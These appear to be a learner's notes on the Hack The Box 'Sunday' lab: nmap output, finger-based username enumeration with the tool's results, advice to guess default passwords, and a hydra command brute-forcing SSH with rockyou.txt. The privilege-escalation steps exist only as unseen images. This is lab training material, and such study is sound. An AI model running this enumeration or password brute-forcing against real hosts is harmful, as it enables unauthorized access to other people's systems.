nmap
```
┌──(kali㉿kali)-[~/HTB/sunday]
└─$ nmap -sT -p- --min-rate 5000 -oA alltcp 10.129.5.162
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 00:11 EST
Warning: 10.129.5.162 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.5.162
Host is up (0.046s latency).
Not shown: 60612 filtered tcp ports (no-response), 4918 closed tcp ports (conn-refused)
PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
515/tcp   open  printer
6787/tcp  open  smc-admin
22022/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 141.10 seconds

┌──(kali㉿kali)-[~/HTB/sunday]
└─$ sudo nmap -sV -sC -p 79,111,22022,65258 -oA nmap_tcp 10.129.5.162
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 00:13 EST
Nmap scan report for 10.129.5.162
Host is up (0.049s latency).

PORT      STATE    SERVICE VERSION
79/tcp    open     finger?
|_finger: No one logged on\x0D
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie: 
|_    Login Name TTY Idle When Where
111/tcp   open     rpcbind 2-4 (RPC #100000)
22022/tcp open     ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
65258/tcp filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port79-TCP:V=7.94SVN%I=7%D=1/14%Time=6785F27F%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,12,"No\x20one\x20logged\x20on\r\n")%r(GetRequest,93,"Login\
SF:x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20
SF:\x20\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nGET\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?
SF:\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\?\?\?\r\n")%r(Help,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nHE
SF:LP\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\?\?\?\r\n")%r(HTTPOptions,93,"Login\x20\x20\x20\x20\x20\x20\x20Name
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Whe
SF:re\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(RTSPRequest,93,"Login\x20\
SF:x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20
SF:\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nRTSP/1\.
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r
SF:(SSLSessionReq,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n\x16\x03\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\?\?\?\r\n")%r(TerminalServerCookie,5D,"Login\x20\x20\x20\x20\x
SF:20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\
SF:x20\x20\x20Where\r\n\x03\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.42 seconds
```

http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz

```
┌──(kali㉿kali)-[~/HTB/sunday/finger-user-enum-1.0]
└─$ ./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.129.5.162 
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 5
Usernames file ........... /usr/share/seclists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10177
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used

######## Scan started at Tue Jan 14 00:23:46 2025 #########
access@10.129.5.162: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
admin@10.129.5.162: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..netadm   Network Admin                      < .  .  .  . >..netcfg   Network Configuratio               < .  .  .  . >..dhcpserv DHCP Configuration A               < .  .  .  . >..ikeuser  IKE Admin                          < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..
anne marie@10.129.5.162: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
bin@10.129.5.162: bin             ???                         < .  .  .  . >..
dee dee@10.129.5.162: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
ike@10.129.5.162: ikeuser  IKE Admin                          < .  .  .  . >..
jo ann@10.129.5.162: Login       Name               TTY         Idle    When    Where..ann                   ???..jo                    ???..
la verne@10.129.5.162: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
line@10.129.5.162: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
message@10.129.5.162: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
miof mela@10.129.5.162: Login       Name               TTY         Idle    When    Where..mela                  ???..miof                  ???..
root@10.129.5.162: root     Super-User            console      <Dec  7, 2023>..
sammy@10.129.5.162: sammy           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
sunny@10.129.5.162: sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
sys@10.129.5.162: sys             ???                         < .  .  .  . >..
zsa zsa@10.129.5.162: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
######## Scan completed at Tue Jan 14 00:28:17 2025 #########
16 results.

10177 queries in 271 seconds (37.6 queries / sec)
```

![Pasted image 20250114133141](<0. Attachments/Pasted image 20250114133141.png>)

![Pasted image 20250114133335](<0. Attachments/Pasted image 20250114133335.png>)

try common passwords like admin, root, the box name, and any defaults for the application
![Pasted image 20250114133532](<0. Attachments/Pasted image 20250114133532.png>)

or use HYDRA instead
```
hydra -V -I -l sunny -P '/usr/share/wordlists/rockyou.txt' 10.129.5.162 ssh -s 22022
```

once we get in we see some interesting files in backup folder
![Pasted image 20250114133748](<0. Attachments/Pasted image 20250114133748.png>)

![Pasted image 20250114135206](<0. Attachments/Pasted image 20250114135206.png>)

![Pasted image 20250114135740](<0. Attachments/Pasted image 20250114135740.png>)

priv esc
![Pasted image 20250114140006](<0. Attachments/Pasted image 20250114140006.png>)
